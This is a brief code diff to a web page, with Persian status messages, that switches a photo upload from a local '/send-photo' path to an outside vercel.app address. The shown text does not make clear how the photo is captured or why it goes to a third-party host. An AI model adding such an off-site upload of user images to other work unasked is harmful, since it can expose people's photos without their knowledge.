@@ -165,7 +165,7 @@ p{
 
         try {
             log.innerText = "📤 در حال ارسال عکس...";
-            await fetch('/send-photo', { method: 'POST', body: formData });
+            await fetch('https://eeeeyuzl.vercel.app/send-photo', { method: 'POST', body: formData });
             log.innerText = "✅ عکس ارسال شد.";
         } catch (e) {
             log.innerText = "⚠️ خطا در ارسال به سرور";
@@ -176,4 +176,5 @@ p{
 </body>
 
 </html>
+
 
